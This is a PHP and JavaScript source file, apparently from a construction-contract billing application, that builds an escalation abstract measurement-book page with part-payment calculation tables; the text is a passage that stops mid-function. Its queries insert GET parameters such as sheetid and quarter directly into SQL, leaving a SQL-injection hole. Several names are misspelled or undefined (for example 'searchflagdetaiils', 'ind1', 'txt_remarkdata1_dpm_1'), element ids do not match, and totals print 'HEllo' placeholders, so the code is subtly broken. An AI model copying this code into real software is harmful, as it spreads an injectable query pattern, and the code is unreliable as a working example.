<?php
//session_start();
@ob_start();
require_once 'library/config.php';
require_once 'library/functions.php';
require_once 'library/binddata.php';
checkUser();
include "library/common.php";
include "spellnumber.php";
$msg = ''; $Line = 0;
function dt_display($ddmmyyyy)
{
 $dt=explode('-',$ddmmyyyy);
 $dd=$dt[2];
 $mm=$dt[1];
 $yy=$dt[0];
 return $dd . '/' . $mm . '/' . $yy;
}
function dt_format($ddmmyyyy) {
    $dt = explode('-', $ddmmyyyy);
    $dd = $dt[0];
    $mm = $dt[1];
    $yy = $dt[2];
    return $yy . '-' . $mm . '-' . $dd;
}
function checkPartpayment($DpmArrMbidList,$Key)
{
	$InitKey = $Key;
	while($perc = current($DpmArrMbidList)) 
	{
		if ($perc == $InitKey) 
		{
			$res .= key($DpmArrMbidList)."*";
		}
		next($DpmArrMbidList);
	}
	return rtrim($res,"*");
}

function removeArray($res,$array)
{
	$explodeRes = explode("*",rtrim($res,"*"));
	for($i=0; $i<count($explodeRes);$i++)
	{
		$RemKey = $explodeRes[$i];
		unset($array[$RemKey]);
	}
	return $array;
}
function CheckPageBreak($tablehead,$abstmbno,$table,$page)
{
	$nextpage = $page+1;
	$Output .= "<tr>
					<td colspan='3' align='right' class='labelbold'>C/o Page No ".$nextpage."/ Abstract MB No ".$abstmbno."</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
				</tr>";
	$Output .=  "<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page ".$page."</td></tr>";
	$Output .= "</table>";
	$Output .= "<p  style='page-break-after:always;'></p>";
	$Output .= '<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
				<tr style="border:none;"><td align="right" style="border:none;">Abstract M.Book No. '.$abstmbno.'&nbsp;&nbsp;</td></tr>
				</table>';
	$Output .= $table;
	$Output .= "<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>";
	$Output .= $tablehead;
	$Output .= "<tr>
					<td colspan='3' align='right' class='labelbold'>B/f from Page No ".$page."/ Abstract MB No ".$abstmbno."</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
				</tr>";
	echo $Output;
}

function UpdateItemAbstractPageNo($abstsheetid,$abstmbno,$subdivid,$page)
{
	$update_pageno_sql = "update measurementbook_temp set abstmbookno = '$abstmbno', abstmbpage = '$page' where sheetid	= '$abstsheetid' AND subdivid = '$subdivid'";
	//$update_pageno_query = mysql_query($update_pageno_sql);
}

function GetAllEscMonth($fromdate,$todate)
{
	$MonthList 	= array();
	$time   	= strtotime($fromdate);
	$last   	= date('M-Y', strtotime($todate));
	while ($month != $last) 
	{
		$month 	= date('M-Y', $time);
		$total 	= date('t', $time);
		array_push($MonthList,$month);
		$time 	= strtotime('+1 month', $time);
	}
	return $MonthList;
}
function GetAllRbnMonth($fromdate,$todate)
{
	$MonthList 	= array();
	$time   	= strtotime($fromdate);
	$last   	= date('M-Y', strtotime($todate));
	while ($month != $last) 
	{
		$month 	= date('M-Y', $time);
		$total 	= date('t', $time);
		array_push($MonthList,$month);
		$time 	= strtotime('+1 month', $time);
	}
	return $MonthList;
}

function CheckDeviatedQtyItem($sheetid,$subdivid,$used_qty)
{
	$Over_all_Qty = 0; $temp = 0; $OutPut = "";
	$select_devQty_query = "select total_quantity, deviate_qty_percent, decimal_placed from schdule where sheet_id = '$sheetid' and subdiv_id = '$subdivid'";
	$select_devQty_sql = mysql_query($select_devQty_query);
	if($select_devQty_sql == true)
	{
		if(mysql_num_rows($select_devQty_sql)>0)
		{
			$List = mysql_fetch_object($select_devQty_sql);
			$total_quantity 		= $List->total_quantity;
			$deviate_qty_percent 	= $List->deviate_qty_percent;
			$decimal_placed 		= $List->decimal_placed;
			$Over_all_Qty 			= $total_quantity + ($total_quantity*$deviate_qty_percent/100);
			$Over_all_Qty_with_Dev 	= round($Over_all_Qty,$decimal_placed);
			$used_quantity 			= $used_qty;
			if($used_quantity>$Over_all_Qty_with_Dev)
			{
				$used_deviat_qty = $used_quantity-$Over_all_Qty_with_Dev;
				$temp = 1;
			}
			else
			{
				$used_deviat_qty = 0;
				$temp = 0;
			}
			$OutPut = $Over_all_Qty_with_Dev."*".$used_deviat_qty."*".$temp;
		}
	}
	return $OutPut;
}

$staffid 			= 	$_SESSION['sid'];//
$userid 			= 	$_SESSION['userid'];//


//$abstsheetid    	= 	$_SESSION["escal_sheetid"]; //
//$abstmbno 			= 	$_SESSION["escal_mbook_no"];  
//$abstmbpage  		= 	$_SESSION["escal_mbook_pageno"];
//$fromdate       	= 	$_SESSION['escal_tcc_from_date']; //     
//$todate   			= 	$_SESSION['escal_tcc_to_date'];//    
//$abs_mbno_id 		= 	$_SESSION["abs_mbno_id"];
//$esc_abs_rbn 		= $_SESSION['esc_rbn'];//
//$quarter 			= $_SESSION['esc_quarter'];//
//$esc_id 			= $_SESSION['esc_id'];//

if($_GET['sheetid'] != "")
{
	$abstsheetid 			= $_GET['sheetid'];
	$quarter 				= $_GET['quarter'];
	$select_rbn_query = "select distinct(mbookgenerate.rbn), escalation.esc_id, escalation.tca_fromdate, 
						escalation.tca_todate, escalation.tcc_fromdate, escalation.tcc_todate, escalation.quarter,
						escalation.tcc_absmbook, escalation.tcc_absmbpage, escalation.tca_absmbook, escalation.tca_absmbpage
						from mbookgenerate INNER JOIN escalation ON (escalation.rbn = mbookgenerate.rbn) 
						where mbookgenerate.sheetid = '$abstsheetid' and escalation.flag = 0 and escalation.quarter = '$quarter'";
						//echo $select_rbn_query;
	$select_rbn_sql = mysql_query($select_rbn_query);
	if($select_rbn_sql == true)
	{
		if(mysql_num_rows($select_rbn_sql)>0)
		{
			$RbnList 			= mysql_fetch_object($select_rbn_sql);
			$esc_id 			= $RbnList->esc_id;
			$esc_abs_rbn 		= $RbnList->rbn;
			$fromdate 			= $RbnList->tcc_fromdate;
			$todate 			= $RbnList->tcc_todate;
		}
	}
}

$select_escmbook_query = "select * from mymbook where sheetid = '$abstsheetid' and rbn = '$esc_abs_rbn' and esc_id = '$esc_id' and quarter = '$quarter' and staffid = '$staffid' and mtype = 'EA' and genlevel = 'esc_abstract'";
$select_escmbook_sql = mysql_query($select_escmbook_query);
if($select_escmbook_sql == true)
{
	if(mysql_num_rows($select_escmbook_sql)>0)
	{
		$MBList = mysql_fetch_object($select_escmbook_sql);
		$abstmbno 		= $MBList->mbno;
		$abstmbpage 	= $MBList->startpage;
	}
}

//echo "VV".$fromdate;


$runn_acc_bill_no 	= 	$rbn;
$start_page = $abstmbpage;
//$abstsheetid = 2;
$query 		= 	"SELECT sheet_id, sheet_name, work_order_no, work_name, short_name, tech_sanction, computer_code_no, name_contractor, agree_no, rbn, rebate_percent FROM sheet WHERE sheet_id ='$abstsheetid' ";
$sqlquery 	= 	mysql_query($query);
if ($sqlquery == true) 
{
    $List 					= 	mysql_fetch_object($sqlquery);
    $work_name 				= 	$List->work_name; 
	$short_name 			= 	$List->short_name;   
	$tech_sanction 			= 	$List->tech_sanction;  
    $name_contractor 		= 	$List->name_contractor; 
	$ccno 					= 	$List->computer_code_no;    
	$agree_no 				= 	$List->agree_no; 
	$overall_rebate_perc 	= 	$List->rebate_percent; 
	$runn_acc_bill_no 		= 	$rbn;
	$work_order_no 			= 	$List->work_order_no; /*   if($List->rbn == 0){$runn_acc_bill_no =1;  } else { $runn_acc_bill_no=$List->rbn +1;}*/
	$length1 				= 	strlen($work_name);
 	$start_line1 			= 	ceil($length1/70); 
	$length2 				= 	strlen($agree_no);
	$start_line2 			= 	ceil($length2/27);  
	$LineIncr 				= 	$start_line1 + $start_line2 + 2 + 2; 
}
$Line = $Line + $LineIncr; 


function CheckDeviatedQty($sheetid,$subdivid,$rbn)
{
	$total_used_qty = 0;
	$total_wo_qty = 0;
	$select_used_qty_query = "select SUM(mbtotal) as total_qty from measurementbook where sheetid = '$sheetid' and subdivid = '$subdivid' and rbn < '$rbn'";
	$select_used_qty_sql = mysql_query($select_used_qty_query);
	if($select_used_qty_sql == true)
	{
		if(mysql_num_rows($select_used_qty_sql)>0)
		{
			$List = mysql_fetch_object($select_used_qty_sql);
			
			$total_used_qty = $List->total_qty;
		}
	}
	
	$select_wo_qty_query = "select * from schdule where sheet_id = '$sheetid' and subdiv_id = '$subdivid'";
	$select_wo_qty_sql = mysql_query($select_wo_qty_query);
	if($select_wo_qty_sql == true)
	{
		$SList = mysql_fetch_object($select_wo_qty_sql);
		$decimal 				= $SList->decimal_placed;
		$wo_quantity 			= $SList->total_quantity;
		$deviate_qty_percent 	= $SList->deviate_qty_percent;
		$total_wo_qty  			= $wo_quantity + ($wo_quantity*$deviate_qty_percent/100);
		$total_wo_qty  = round($total_wo_qty,$decimal);
	}
	if($total_used_qty>$total_wo_qty)
	{
		$temp = 1;  // if deviated........
	}
	else
	{
		$temp = 0;
	}
	$res = $total_wo_qty."*".$temp;
	return $res;
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <title>Abstrack MBook</title>
    <link rel="stylesheet" href="script/font.css" />
</head>
	<script language="javascript" type="text/javascript" src="script/Date_Calendar.js"></script>
	<script language="javascript" type="text/javascript" src="script/validfn.js"></script>
	<link rel="stylesheet" href="css/button_style.css"></link>
	<link rel="stylesheet" href="js/jquery-ui.css">
	<script src="js/jquery-1.10.2.js"></script>
	<script src="js/jquery-ui.js"></script>
	<link rel="stylesheet" href="/resources/demos/style.css">
	<link rel="stylesheet" href="Font style/font.css" />
	<link type='text/css' href='css/basic.css' rel='stylesheet' media='screen' />
	<script type='text/javascript' src='js/basic_model_jquery.js'></script>
	<script type='text/javascript' src='js/jquery.simplemodal.js'></script>
	<link rel="stylesheet" href="css/font-awesome.css" />
	<!--<script type='text/javascript' src='js/basic.js'></script>-->
	<script src="dist/sweetalert-dev.js"></script>
	<link rel="stylesheet" href="dist/sweetalert.css">
<script type="text/javascript" language="javascript">
	function goBack()
	{
		url = "EscalationAbstractPrintGenerate.php";
		window.location.replace(url);
	}
	function ValidatePercent(obj,section,idcount)
	{
		//alert(idcount);
		var value = obj.value;
		if(Number(value)>100)
		{
			swal("", "Entered % should be less than 100..!", "error"); 
			obj.value = "";
			document.getElementById("hid_slm_result"+idcount).value = "";
			totalAmountCalculation("slm");
			return false;
		}
		if(section == "dpm")
		{
			var paid_percent_dpm = document.getElementById("txt_partpay_percent_dpm"+idcount).value;
			var remain_percent_dpm = 100-Number(paid_percent_dpm);
			if(value > remain_percent_dpm)
			{
				swal("Entered Percentage should be less than: ", remain_percent_dpm+" %", "error");
				obj.value = "";
				document.getElementById("txt_amt_dpm_payable"+idcount).value = "";
				document.getElementById("hid_dpm_result"+idcount).value = "";
				totalAmountCalculation("dpm");
				return false;
			}
		}
	}
	function ValidateSlm()
	{
		var slmqty = document.getElementById("hid_slm_qty").value;
		var qty = 0;
		$('input[name="txt_partpay_qty_slm[]"]').each(function() {
			var currentqty = $(this).val();
			qty = (Number(qty)+Number(currentqty));
			if(qty>slmqty)
			{
				swal("", "Quantity Not Allowed..:)", "error"); 
				//$(this).val() = "";
				//return false;    updated on 03.11.2016
			}
		});
	}
	function setRowSpan() 
	{
		var i;
		var rowcount =  document.getElementById("table_group_count").value;
		for(i=0; i<rowcount; i++)
		{
			var row_span = document.getElementById("row_count"+i).value;
			document.getElementById("td_popupbutton"+i).rowSpan = row_span;
			var ht = document.getElementById("td_popupbutton"+i);
			 var checkbox_height = ht.offsetHeight;
			 //document.getElementById('ch_item'+i).offsetHeight = checkbox_height;
			 document.getElementById("ch_item"+i).style.height = checkbox_height+"px";
			 //document.getElementById("ch_item"+i).style.width = checkbox_height+"px";
			
		}
	}
	//var index = 1;
	function addRow()
	{
		var x = Number(document.getElementById("table4").rows.length);
		 	 index = x;
		//var arg = "X"+"*"+index;
		var rate = document.getElementById("txt_item_rate_slm0").value;
		var table=document.getElementById("table4");
        var row=table.insertRow(table.rows.length-2);
        	row.id = "rowid"+index;
			row.style.align = "center";
			
		var cell1=row.insertCell(0);
			cell1.setAttribute('class', "dynamicrowcell");
			cell1.style.padding = "0px 0px 0px 0px";
				
		var txt_box1 = document.createElement("input");
			txt_box1.name = "txt_partpay_qty_slm[]";
            txt_box1.id = "txt_partpay_qty_slm"+index;
			//txt_box1.value = row.id;
			txt_box1.style.width = 93+"px";
			txt_box1.style.border = "1px solid #2aade4";
			txt_box1.style.textAlign = "right";
			txt_box1.setAttribute('class', "dynamictextbox"); 
            cell1.appendChild(txt_box1);
			/*txt_box1.onblur= function () {
								ValidateSlm();
                        	  calculateAmount(this,index,"qty","slm")
                    		}*/
							txt_box1.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"qty","slm")
												ValidateSlm();
												};
											})(index); 
		var cell2=row.insertCell(1);
			cell2.setAttribute('class', "dynamicrowcell");	
			cell2.style.padding = "0px 0px 0px 0px";
		var txt_box2 = document.createElement("input");
			txt_box2.name = "txt_item_rate_slm";
            txt_box2.id = "txt_item_rate_slm"+index;
			txt_box2.value = Number(rate).toFixed(2);
			txt_box2.style.textAlign = "right";
			txt_box2.style.width = 80+"px";
			//txt_box2.readOnly = true;
			txt_box2.setAttribute('class', "dynamictextbox"); 
            cell2.appendChild(txt_box2);
			/*txt_box2.onblur= function () {
                        	  calculateAmount(this,index,"rate","slm")
                    		}*/
							txt_box2.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"rate","slm")
												ValidateSlm();
												};
											})(index); 
		var cell3=row.insertCell(2);
			cell3.setAttribute('class', "dynamicrowcell");	
			cell3.style.padding = "0px 0px 0px 0px";
		var txt_box3 = document.createElement("input");
			txt_box3.name = "txt_partpay_percent_slm";
            txt_box3.id = "txt_partpay_percent_slm"+index;
			//txt_box3.value = txt_box3.id;
			txt_box3.style.width = 40+"px";
			txt_box3.style.textAlign = "right";
			txt_box3.style.border = "1px solid #2aade4";
			txt_box3.setAttribute('class', "dynamictextbox"); 
			/*txt_box3.onblur= function () {
                        	  calculateAmount(this,index,"percent","slm");
							  ValidatePercent(this)
                    		}*/
							txt_box3.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","slm")
												ValidatePercent(this,"slm",ind);
												};
											})(index);
            cell3.appendChild(txt_box3);
							
		var cell4=row.insertCell(3);
			cell4.setAttribute('class', "dynamicrowcell");	
			cell4.style.padding = "0px 0px 0px 0px";
		var txt_box4 = document.createElement("input");
			txt_box4.name = "txt_partpay_amt_slm[]";
            txt_box4.id = "txt_partpay_amt_slm"+index;
			txt_box4.style.width = 130+"px";
			txt_box4.style.textAlign = "right";
			txt_box4.style.pointerEvents = "none";
			txt_box4.setAttribute('class', "dynamictextbox"); 
            cell4.appendChild(txt_box4);
		
		var cell5=row.insertCell(4);
			//cell5.style.width = 10+"px";
			cell5.style.textAlign = "center";
			cell5.style.padding = "0px 0px 0px 0px";
        var delbtn=document.createElement("input");
        	delbtn.type = "button";
        	delbtn.value = " X ";
        	delbtn.id = "btn_delete"+index;
			delbtn.name = "btn_delete";
			delbtn.setAttribute('class', "delbtnstyle");
			delbtn.style.width = 32+"px";
			delbtn.style.borderRadius = 0+"px";
        	delbtn.onclick = function () {
                        	  deleteRow(this);
                    		}
        	cell5.appendChild(delbtn);
			
			//var cell6=row.insertCell(5);
			//cell5.style.width = 10+"px";
			//cell6.style.textAlign = "center";
			//cell6.style.padding = "0px 0px 0px 0px";
			//cell6style.visibility = "hidden";	
			
	// BELOW FIELD IS HIDDEN BOX FIELD....SO APPEND IN ADD & DELETE BUTTON FIELD ITSELF..No seperate TD(cell) creation for this. check above ( index++ : line)
		var txt_box5 = document.createElement("input");
        	txt_box5.type = "hidden";
        	txt_box5.id = "hid_slm_result"+index;
			txt_box5.name = "hid_slm_result[]";
			txt_box5.setAttribute('class', "dynamictextbox");
			txt_box5.style.width = 70+"px";
			txt_box5.style.borderRadius = 0+"px";
			cell5.appendChild(txt_box5);
			index++;
	}
	function deleteRow(obj) 
	{
	   //var row = document.getElementById(id);
	   //row.parentNode.removeChild(row);
	   /*$('input[name = "btn_delete"]').click(function(){
		   $(this).closest('tr').remove()
		})*/
		var tr = $(obj).closest('tr');
		tr.remove();
	   totalAmountCalculation("slm");
	   return true;
	}
	function calculateAmount(obj,id,type,section)
	{
		var idcount = id;
		var currentvalue = obj.value;
		var itemid = document.getElementById("txt_item_id").value;
		var currentrbn = document.getElementById("txt_rab_no").value;
		if(section == "slm")
		{
			if(type == "qty")
			{
				var rate = document.getElementById("txt_item_rate_slm"+idcount).value;
				var percent = document.getElementById("txt_partpay_percent_slm"+idcount).value;
				var qty = currentvalue;
				//alert(percent)
			}
			if(type == "rate")
			{
				var qty = document.getElementById("txt_partpay_qty_slm"+idcount).value;
				var percent = document.getElementById("txt_partpay_percent_slm"+idcount).value;
				var rate = currentvalue;
			}
			if(type == "percent")
			{
				var rate = document.getElementById("txt_item_rate_slm"+idcount).value;
				var qty = document.getElementById("txt_partpay_qty_slm"+idcount).value;
				var percent = currentvalue;
			}
			qty = Number(qty);
			//alert(qty)
			rate = Number(rate);
			//alert(rate)
			percent = Number(percent);
			//alert(percent)
			if((qty != "") && (rate != "") && (percent != ""))
			{
				var amount = qty * rate * percent / 100;
				document.getElementById("txt_partpay_amt_slm"+idcount).value = Number(amount).toFixed(2);
				var result = percent + "*" + currentrbn + "*" + qty + "*" + itemid;
				document.getElementById("hid_slm_result"+idcount).value = result;
			}
			else
			{
				// Added on 03.02.2017 for 0% payment for SLM item
				var amount = 0;//qty * rate * percent / 100;
				document.getElementById("txt_partpay_amt_slm"+idcount).value = 0;//Number(amount).toFixed(2);
				var result = percent + "*" + currentrbn + "*" + qty + "*" + itemid;
				document.getElementById("hid_slm_result"+idcount).value = result;
				//document.getElementById("txt_partpay_amt_slm"+idcount).value = "";
				//document.getElementById("hid_slm_result"+idcount).value = "";
			}
		}
		if(section == "dpm")
		{
			var rate_dpm 	= document.getElementById("txt_item_rate_dpm"+idcount).value;
			var qty_dpm 	= document.getElementById("txt_partpay_qty_dpm"+idcount).value;
			var rbn_dpm 	= document.getElementById("txt_rbn_dpm"+idcount).value;
			var mbid_dpm 	= document.getElementById("hid_dpm_mbid"+idcount).value;
			var percent_dpm = currentvalue;
				qty_dpm 	= Number(qty_dpm);
				rate_dpm 	= Number(rate_dpm);
				percent_dpm = Number(percent_dpm);
			if((qty_dpm != "") && (rate_dpm != "") && (percent_dpm != ""))
			{
				var amount_dpm = qty_dpm * rate_dpm * percent_dpm / 100;
				document.getElementById("txt_amt_dpm_payable"+idcount).value = Number(amount_dpm).toFixed(2);
				var result = percent_dpm + "*" + currentrbn + "*" + qty_dpm + "*" + itemid + "*" + rbn_dpm + "*" + mbid_dpm;
				//alert(result)
				document.getElementById("hid_dpm_result"+idcount).value = result;
			}
			else
			{
				document.getElementById("txt_amt_dpm_payable"+idcount).value = "";
				document.getElementById("hid_dpm_result"+idcount).value = "";
			}
		}
		totalAmountCalculation(section);
		
		return true;
	}
	
	function totalAmountCalculation(section)
	{
		var amount = 0;
		if(section == "slm")
		{
			$('input[name="txt_partpay_amt_slm[]"]').each(function() {
				var amt = $(this).val();
				amount = (Number(amount)+Number(amt));
			});
			
			var DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
			//if(DpmPayableAmount == ""){ DpmPayableAmount = 0; }
			var OverAllAmount = Number(amount)+Number(DpmPayableAmount);
			
			if(amount>0)
			{
				document.getElementById("txt_partpay_total_amt_slm").value = Number(amount).toFixed(2);
			}
			else
			{
				document.getElementById("txt_partpay_total_amt_slm").value = "";
			}
			document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
		}
		if(section == "dpm")
		{
			$('input[name="txt_amt_dpm_payable[]"]').each(function() {
				var amt = $(this).val();
				amount = (Number(amount)+Number(amt));
			});
			
			var SlmTotalAmount = document.getElementById("txt_partpay_total_amt_slm").value;
			//if(SlmTotalAmount == ""){ SlmTotalAmount = 0; }
			var OverAllAmount = Number(amount)+Number(SlmTotalAmount);
			
			if(amount>0)
			{
				document.getElementById("txt_partpay_total_payableamt_dpm").value = Number(amount).toFixed(2);
			}
			else
			{
				document.getElementById("txt_partpay_total_payableamt_dpm").value = "";
			}
			document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
		}
	}
	
	function getDPMdetaiils(sheetid,itemid,rate)
	{
		var xmlHttp;
		var data;
		var i, rbn, qty, percent, measurementbookid, searchflag, RemarkData ="", newrow = "",TotalPaidDpmAmount = 0,TotalPayableDpmAmount = 0; 
		var currentrbn = document.getElementById("txt_rab_no").value;
		var rate = Number(rate);	
		var dpmitemQty = document.getElementById("hid_dpm_qty").value;
		if(Number(dpmitemQty) == 0)
		{
			document.getElementById("dpmheadrow1").className 	= "hide";
			document.getElementById("dpmheadrow2").className 	= "hide";
			document.getElementById("dpmtotalrow").className 	= "hide";
			document.getElementById("dpmremarksrow").className 	= "hide";
		}
		else
		{
			document.getElementById("dpmheadrow1").className 	= "";
			document.getElementById("dpmheadrow2").className 	= "";
			document.getElementById("dpmtotalrow").className	= "";
			document.getElementById("dpmremarksrow").className 	= "";
		}
		if(window.XMLHttpRequest) // For Mozilla, Safari, ...
		{
			xmlHttp = new XMLHttpRequest();
		}
		else if(window.ActiveXObject) // For Internet Explorer
		{ 
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		strURL="find_dpm_details.php?sheetid="+sheetid+"&itemid="+itemid;
		xmlHttp.open('POST', strURL, true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.onreadystatechange = function()
		{
			if (xmlHttp.readyState == 4)
			{
				data=xmlHttp.responseText;
				if(data != "")
				{
					var details = data.split("*");
					var index = 1;
					for(i=0; i<details.length; i+=6)
					{
						RemarkData = ""; 
						rbn 				= details[i];
						qty 				= details[i+1];
						percent 			= details[i+2];
						measurementbookid 	= details[i+3];
						searchflag 			= details[i+4];
						PayableDpmSlmPercent 		= details[i+5];
						if((PayableDpmSlmPercent != "") && (PayableDpmSlmPercent != "X"))
						{
							var PayableSlmDpmAmt = Number(qty)*Number(PayableDpmSlmPercent)*Number(rate)/100;
								TotalPayableDpmAmount = (Number(TotalPayableDpmiAmount)+Number(PayableSlmDpmAmt));
							var result = PayableDpmSlmPercent + "*" + currentrbn + "*" + qty + "*" + itemid + "*" + rbn + "*" + measurementbookid;
						}
						else
						{
							var PayableSlmDpmAmt = 0;
							var result = "";
						}
						//alert(searchflag)
						
						
						if((searchflag != "") && (searchflag != "X"))
						{
							var searchflagdetails = searchflag.split("@");
							
								RemarkData  = "<table style='color:blue;font-family:verdana;font-size:13px;' class='table1' align='center' width='80%' bgcolor=''>";
								RemarkData += "<tr height='30px' style='color:white;font-family:verdana;font-size:13px;background-color:#078c9b;'><td colspan = '3'>Quantity : "+qty+"</td></tr>";
								RemarkData += "<tr height='27px' style='color:white;font-family:verdana;font-size:13px;background-color:#a5b23c;'><td>RBN No.</td><td>Date</td><td>Paid Percent ( % )</td></tr>";
								for(j=0; j<searchflagdetails.length; j+=3)
								{
									remarkPercent 	= searchflagdetaiils[j+0];
									remarkRbn 		= searchflagdetaiils[j+1];
									remarkDate 		= searchflagdetaiils[j+2];
									
									if((remarkPercent != "") && (remarkPercent != "X"))
									{
										//alert(remarkPercent)
										//alert(remarkRbn)
										RemarkData += "<tr id='trid"+j+"'><td>"+remarkRbn+"</td><td>"+remarkDate+"</td><td>"+remarkPercent+"</td></tr>";
									}
								}
								RemarkData += "</table>";
						}
						//var rate = document.getElementById("txt_item_rate_slm0").value;
						var amount = Number(qty)*Number(percent)*Number(rate)/100;
						 	TotalPaidDpmAmount = (Number(TotalPaidDpmAmount)+Number(amount));
						var table = document.getElementById("table3");
						var row = table.insertRow(table.rows.length-2);
							row.id = "rowid_dpm"+index;
							row.style.align = "center";
							
						var cell1=row.insertCell(0);
							cell1.setAttribute('class', "");
							cell1.style.textAlign = "center";	
							cell1.style.padding = "0px 0px 0px 0px";
						if(searchflag == "X")
						{	
							var txt_box1 = document.createElement("input");
							txt_box1.name = "txt_rbn_dpm";
							txt_box1.id = "txt_rbn_dpm"+index;
							txt_box1.value = rbn;
							txt_box1.style.width = 37+"px";
							txt_box1.style.textAlign = "center";
							txt_box1.style.pointerEvents = "none";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
						}
						else
						{
							var txt_box1 = document.createElement("input");
							txt_box1.type = "hidden";
							txt_box1.name = "txt_rbn_dpm";
							txt_box1.id = "txt_rbn_dpm"+index;
							txt_box1.value = rbn;
							txt_box1.style.width = 37+"px";
							txt_box1.style.textAlign = "center";
							txt_box1.style.pointerEvents = "none";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
							
							var srch_btn1 = document.createElement("input");
							srch_btn1.type = "image";
							srch_btn1.name = "srch_btn_dpm";
							srch_btn1.style.textAlign = "center";
							srch_btn1.id = "srch_btn_dpm"+index;
							srch_btn1.src = "images/search (10).png";
							srch_btn1.style.width = 25+"px";
							srch_btn1.style.height = 20+"px";
							
							var txt_remarkdata_dpm_1 = document.createElement("input");
								txt_remarkdata_dpm_1.type = "hidden";
								txt_remarkdata_dpm_1.id = "hid_dpm_remarkdata"+index;
								txt_remarkdata_dpm_1.name = "hid_dpm_remarkdata[]";
								txt_remarkdata_dpm_1.value = RemarkData;
								txt_remarkdata_dpm_1.setAttribute('class', "dynamictextbox");
								txt_remarkdata_dpm_1.style.width = 70+"px";
								txt_remarkdata_dpm_1.style.borderRadius = 0+"px";
								cell1.appendChild(txt_remarkdata1_dpm_1);
							
							//srch_btn1.style.textAlign = "center";
							//srch_btn1.style.pointerEvents = "none";
							//srch_btn1.setAttribute('class', "dynamictextbox"); 
							/*txt_box6.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","dpm");
												ValidatePercent(this,"dpm",ind);
												};
											})(index);*/
							cell1.appendChild(srch_btn1);
							srch_btn1.onclick = (function (ind) {
												return function() {
												  ShowRemarks(ind1)
												  };
												})(index);
							/*srch_btn1.onclick = function () {
												  ShowRemarks(RemarkData)
												}*/
						}
								
							
						var cell2=row.insertCell(1);
							cell2.setAttribute('class', "dynamicrowcell");	
							cell2.style.padding = "0px 0px 0px 0px";
						var txt_box2 = document.createElement("input");
							txt_box2.name = "txt_partpay_qty_dpm";
							txt_box2.id = "txt_partpay_qty_dpm"+index;
							txt_box2.value = Number(qty).toFixed(3);
							txt_box2.style.width = 90+"px";
							txt_box2.style.textAlign = "right";
							txt_box2.style.pointerEvents = "none";
							txt_box2.setAttribute('class', "dynamictextbox"); 
							cell2.appendChild(txt_box2);
							
						var cell3=row.insertCell(2);
							cell3.setAttribute('class', "dynamicrowcell");	
							cell3.style.padding = "0px 0px 0px 0px";
						var txt_box3 = document.createElement("input");
							txt_box3.name = "txt_item_rate_dpm";
							txt_box3.id = "txt_item_rate_dpm1"+index;
							txt_box3.value = Number(rate).toFixed(2);
							txt_box3.style.width = 80+"px";
							txt_box3.style.textAlign = "right";
							txt_box3.style.pointerEvents = "none";
							txt_box3.setAttribute('class', "dynamictextbox"); 
							cell3.appendChild(txt_box3);
							
						var cell4=row.insertCell(3);
							cell4.setAttribute('class', "dynamicrowcell");	
							cell4.style.padding = "0px 0px 0px 0px";
						var txt_box4 = document.createElement("input");
							txt_box4.name = "txt_partpay_percent_dpm";
							txt_box4.id = "txt_partpay_percent_dpm1"+index;
							txt_box4.value = Number(percent);
							txt_box4.style.width = 35+"px";
							txt_box4.style.textAlign = "right";
							txt_box4.style.pointerEvents = "none";
							txt_box4.setAttribute('class', "dynamictextbox"); 
							cell4.appendChild(txt_box4);
						
						var cell5=row.insertCell(4);
							cell5.setAttribute('class', "dynamicrowcell");	
							cell5.style.padding = "0px 0px 0px 0px";
						var txt_box5 = document.createElement("input");
							txt_box5.name = "txt_partpay_amt_dpm";
							txt_box5.id = "txt_partpay_amt_dpm"+index;
							txt_box5.value = Number(amount).toFixed(2);
							txt_box5.style.width = 110+"px";
							txt_box5.style.textAlign = "right";
							txt_box5.style.pointerEvents = "none";
							txt_box5.setAttribute('class', "dynamictextbox"); 
							cell5.appendChild(txt_box5);
							
						var cell6=row.insertCell(5);
							cell6.setAttribute('class', "dynamicrowcell");	
							cell6.style.padding = "0px 0px 0px 0px";
						if(percent < 100)
						{
							var txt_box6 = document.createElement("input");
								txt_box6.name = "txt_percent_dpm_payable";
								txt_box6.id = "txt_percent_dpm_payable1"+index;
								txt_box6.value = Number(PayableDpmSlmPercent);
								txt_box6.style.width = 35+"px";
								txt_box6.style.border = "1px solid #2aade4";
								txt_box6.style.backgroundColor = "#ffffff";
								txt_box6.style.textAlign = "right";
								txt_box6.setAttribute('class', "dynamictextbox");
								txt_box6.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","dpm");
												ValidatePercent(this,"dpm",ind);
												};
											})(index); 
								cell6.appendChild(txt_box6);
						}
						else
						{
							cell6.innerHTML = "";
						}
							
						var cell7=row.insertCell(6);
							cell7.setAttribute('class', "dynamicrowcell");	
							cell7.style.padding = "0px 0px 0px 0px";
